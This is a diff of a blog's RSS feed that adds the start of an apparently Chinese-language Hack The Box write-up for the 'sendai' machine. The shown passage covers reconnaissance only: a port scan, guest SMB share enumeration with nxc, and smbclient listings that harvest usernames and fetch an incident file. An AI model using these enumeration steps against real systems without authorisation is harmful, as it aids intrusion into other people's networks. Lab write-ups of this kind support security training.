@@ -2,16 +2,620 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
     <channel>
         <title>题目wp on wackymaker</title>
-        <link>https://wackymaker.github.io/categories/%E9%A2%98%E7%9B%AEwp/</link>
+        <link>http://localhost:1313/categories/%E9%A2%98%E7%9B%AEwp/</link>
         <description>Recent content in 题目wp on wackymaker</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Mon, 01 Sep 2025 20:56:42 +0800</lastBuildDate><atom:link href="https://wackymaker.github.io/categories/%E9%A2%98%E7%9B%AEwp/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Thu, 18 Sep 2025 21:40:42 +0800</lastBuildDate><atom:link href="http://localhost:1313/categories/%E9%A2%98%E7%9B%AEwp/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>sendai-wp</title>
+        <link>http://localhost:1313/post/sendai/</link>
+        <pubDate>Thu, 18 Sep 2025 21:40:42 +0800</pubDate>
+        
+        <guid>http://localhost:1313/post/sendai/</guid>
+        <description>&lt;h2 id=&#34;初始侦察&#34;&gt;初始侦察
+&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/sendai&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ cat rustscan.txt 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| &lt;span style=&#34;color:#f92672&#34;&gt;{}&lt;/span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;| &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; |&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;__ &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;_   _&lt;span style=&#34;color:#f92672&#34;&gt;}{&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;__  /  ___&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; / &lt;span style=&#34;color:#f92672&#34;&gt;{}&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;\ &lt;/span&gt;|  &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;| |
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| .-. &lt;span style=&#34;color:#ae81ff&#34;&gt;\|&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;_&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; |.-._&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; | |  .-._&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\ &lt;/span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;/  /&lt;span style=&#34;color:#ae81ff&#34;&gt;\ &lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;\|&lt;/span&gt; |&lt;span style=&#34;color:#ae81ff&#34;&gt;\ &lt;/span&gt; |
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;-&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; `-&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;-----&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;`----&amp;#39;&lt;/span&gt;  &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;-&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;  `----&amp;#39;&lt;/span&gt;  &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;---&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; `-&amp;#39;&lt;/span&gt;  &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;-&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;`-&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;-&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;The Modern Day Port Scanner.
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;________________________________________
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: http://discord.skerritt.blog         :
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: https://github.com/RustScan/RustScan :
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; --------------------------------------
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Breaking and entering... into the world of open ports.
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[~] The config file is expected to be at &amp;#34;/home/wackymaker/.rustscan.toml&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[!] Your file limit is very small, which negatively impacts RustScan&amp;#39;&lt;/span&gt;s speed. Use the Docker image, or up the Ulimit with &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;--ulimit 5000&amp;#39;&lt;/span&gt;. 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Open 10.129.234.66:53
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Open 10.129.234.66:80
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Open 10.129.234.66:88
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Open 10.129.234.66:135
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Open 10.129.234.66:139
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Open 10.129.234.66:389
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Open 10.129.234.66:443
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Open 10.129.234.66:445
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Open 10.129.234.66:464
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Open 10.129.234.66:593
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Open 10.129.234.66:636
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Open 10.129.234.66:3269
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Open 10.129.234.66:3268
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Open 10.129.234.66:3389
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Open 10.129.234.66:5985
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Open 10.129.234.66:9389
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/sendai&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ cat hostname 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;10.129.234.66     DC.sendai.vl sendai.vl DC
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/sendai&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ cat start.sh 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;10.129.234.66
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;80和443虽然开启，但都是iis初始页面，先不着急&lt;/p&gt;
+&lt;p&gt;存在匿名smb，看信息&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/sendai&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ nxc smb &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$ip&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; -u guest -p &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt; --shares
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    DC               &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Windows Server &lt;span style=&#34;color:#ae81ff&#34;&gt;2022&lt;/span&gt; Build &lt;span style=&#34;color:#ae81ff&#34;&gt;20348&lt;/span&gt; x64 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;name:DC&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;domin:sendai.vl&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;signing:True&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;SMBv1:False&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Null Auth:True&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    DC               &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; sendai.vl&lt;span style=&#34;color:#ae81ff&#34;&gt;\g&lt;/span&gt;uest: 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    DC               &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Enumerated shares
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    DC               Share           Permissions     Remark
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    DC               -----           -----------     ------
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    DC               ADMIN$                          Remote Admin
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    DC               C$                              Default share
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    DC               config                          
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    DC               IPC$            READ            Remote IPC
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    DC               NETLOGON                        Logon server share
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    DC               sendai          READ            company share
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    DC               SYSVOL                          Logon server share
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    DC               Users           READ            
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/sendai&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;users目录没什么东西，但是sendai中我获得了一些用户名&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;smb: &lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;gt;&lt;/span&gt; cd transfer&lt;span style=&#34;color:#ae81ff&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;smb: &lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;ransfer&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;gt;&lt;/span&gt; dir
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  .                                   D        &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  Tue Jul &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; 09:00:20 &lt;span style=&#34;color:#ae81ff&#34;&gt;2023&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ..                                  D        &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  Tue Jul &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; 13:31:04 &lt;span style=&#34;color:#ae81ff&#34;&gt;2023&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  anthony.smith                       D        &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  Tue Jul &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; 08:59:50 &lt;span style=&#34;color:#ae81ff&#34;&gt;2023&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  clifford.davey                      D        &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  Tue Jul &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; 09:00:06 &lt;span style=&#34;color:#ae81ff&#34;&gt;2023&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  elliot.yates                        D        &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  Tue Jul &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; 08:59:26 &lt;span style=&#34;color:#ae81ff&#34;&gt;2023&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  lisa.williams                       D        &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  Tue Jul &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; 08:59:34 &lt;span style=&#34;color:#ae81ff&#34;&gt;2023&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  susan.harper                        D        &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  Tue Jul &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; 08:59:39 &lt;span style=&#34;color:#ae81ff&#34;&gt;2023&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  temp                                D        &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  Tue Jul &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; 09:00:16 &lt;span style=&#34;color:#ae81ff&#34;&gt;2023&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  thomas.powell                       D        &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  Tue Jul &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; 08:59:45 &lt;span style=&#34;color:#ae81ff&#34;&gt;2023&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#ae81ff&#34;&gt;7019007&lt;/span&gt; blocks of size 4096. &lt;span style=&#34;color:#ae81ff&#34;&gt;855070&lt;/span&gt; blocks available
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;smb: &lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;ransfer&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;gt;&lt;/span&gt; cd ../
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;smb: &lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;gt;&lt;/span&gt; dir
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  .                                   D        &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  Tue Jul &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; 13:31:04 &lt;span style=&#34;color:#ae81ff&#34;&gt;2023&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ..                                DHS        &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  Tue Apr &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt; 22:55:42 &lt;span style=&#34;color:#ae81ff&#34;&gt;2025&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  hr                                  D        &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  Tue Jul &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; 08:58:19 &lt;span style=&#34;color:#ae81ff&#34;&gt;2023&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  incident.txt                        A     &lt;span style=&#34;color:#ae81ff&#34;&gt;1372&lt;/span&gt;  Tue Jul &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; 13:34:15 &lt;span style=&#34;color:#ae81ff&#34;&gt;2023&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  it                                  D        &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  Tue Jul &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; 09:16:46 &lt;span style=&#34;color:#ae81ff&#34;&gt;2023&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  legal                               D        &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  Tue Jul &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; 08:58:23 &lt;span style=&#34;color:#ae81ff&#34;&gt;2023&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  security                            D        &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  Tue Jul &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; 09:17:35 &lt;span style=&#34;color:#ae81ff&#34;&gt;2023&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  transfer                            D        &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  Tue Jul &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; 09:00:20 &lt;span style=&#34;color:#ae81ff&#34;&gt;2023&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#ae81ff&#34;&gt;7019007&lt;/span&gt; blocks of size 4096. &lt;span style=&#34;color:#ae81ff&#34;&gt;853509&lt;/span&gt; blocks available
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;smb: &lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;gt;&lt;/span&gt; get incident.txt 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;getting file &lt;span style=&#34;color:#ae81ff&#34;&gt;\i&lt;/span&gt;ncident.txt of size &lt;span style=&#34;color:#ae81ff&#34;&gt;1372&lt;/span&gt; as incident.txt &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;3.4 KiloBytes/sec&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;average 7.0 KiloBytes/sec&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;smb: &lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;gt;&lt;/span&gt; dir
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  .                                   D        &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  Tue Jul &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; 13:31:04 &lt;span style=&#34;color:#ae81ff&#34;&gt;2023&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ..                                DHS        &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  Tue Apr &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt; 22:55:42 &lt;span style=&#34;color:#ae81ff&#34;&gt;2025&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  hr                                  D        &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  Tue Jul &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; 08:58:19 &lt;span style=&#34;color:#ae81ff&#34;&gt;2023&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  incident.txt                        A     &lt;span style=&#34;color:#ae81ff&#34;&gt;1372&lt;/span&gt;  Tue Jul &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; 13:34:15 &lt;span style=&#34;color:#ae81ff&#34;&gt;2023&lt;/span&gt;
